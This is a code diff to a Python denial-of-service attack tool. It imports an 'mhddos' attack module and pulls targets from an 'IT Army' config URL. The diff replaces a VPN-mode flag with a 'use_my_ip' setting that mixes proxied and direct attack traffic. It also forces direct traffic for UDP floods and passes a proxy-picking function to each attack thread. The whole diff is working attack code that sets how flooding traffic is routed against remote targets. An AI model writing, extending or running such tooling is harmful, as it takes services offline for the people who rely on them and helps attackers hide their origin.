@@ -12,12 +12,12 @@ from src.cli import init_argparse
 from src.concurrency import DaemonThreadPool
 from src.core import (
     logger, cl, LOW_RPC, IT_ARMY_CONFIG_URL, WORK_STEALING_DISABLED,
-    DNS_WORKERS, Params, Stats, PADDING_THREADS
+    DNS_WORKERS, Params, Stats, PADDING_THREADS, ONLY_MY_IP
 )
 from src.dns_utils import resolve_all_targets
 from src.mhddos import main as mhddos_main
 from src.output import show_statistic, print_banner, print_progress
-from src.proxies import update_proxies
+from src.proxies import update_proxies, NoProxy
 from src.system import fix_ulimits, is_latest_version
 from src.targets import Targets
 
@@ -111,15 +111,18 @@ def run_ddos(
     period,
     rpc,
     http_methods,
-    vpn_mode,
+    use_my_ip,
     debug,
     table,
 ):
     statistics, event, kwargs_list, udp_kwargs_list = {}, Event(), [], []
-    proxies_cnt = len(proxies)
 
     def get_proxy():
-        return random.choice()
+        if use_my_ip == ONLY_MY_IP:
+            return NoProxy
+        if use_my_ip != 0 and random.random() <= use_my_ip:
+            return NoProxy
+        return random.choice(proxies)
 
     def register_params(params, container):
         thread_statistics = Stats()
@@ -131,7 +134,7 @@ def run_ddos(
             'rpc': int(params.target.option("rpc", "0")) or rpc,
             'event': event,
             'stats': thread_statistics,
-            'proxies': proxies,
+            'get_proxy': get_proxy,
         }
         container.append(kwargs)
         if not (table or debug):
@@ -173,7 +176,7 @@ def run_ddos(
     event.set()
 
     if not (table or debug):
-        print_progress(period, 0, len(proxies))
+        print_progress(period, 0, len(proxies), use_my_ip)
         time.sleep(period)
     else:
         ts = time.time()
@@ -183,14 +186,15 @@ def run_ddos(
             passed = time.time() - ts
             if passed > period:
                 break
-            show_statistic(statistics, refresh_rate, table, vpn_mode, proxies_cnt, period, passed)
+            show_statistic(statistics, refresh_rate, table, use_my_ip, len(proxies), period, passed)
             time.sleep(refresh_rate)
 
     event.clear()
 
 
 def start(args):
-    print_banner(args.vpn_mode)
+    use_my_ip = min(args.use_my_ip, ONLY_MY_IP)
+    print_banner(use_my_ip)
     fix_ulimits()
 
     if args.table:
@@ -247,8 +251,11 @@ def start(args):
                 f'через збільшення кількості перепідключень{cl.RESET}'
             )
 
-        no_proxies = args.vpn_mode or all(target.is_udp for target in targets)
-        if no_proxies:
+        current_use_my_ip = use_my_ip
+        if all(target.is_udp for target in targets):
+            current_use_my_ip = ONLY_MY_IP
+
+        if current_use_my_ip == ONLY_MY_IP:
             proxies = []
         else:
             proxies = list(update_proxies(args.proxies, proxies))
@@ -262,7 +269,7 @@ def start(args):
             period,
             args.rpc,
             args.http_methods,
-            args.vpn_mode,
+            current_use_my_ip,
             args.debug,
             args.table,
         )
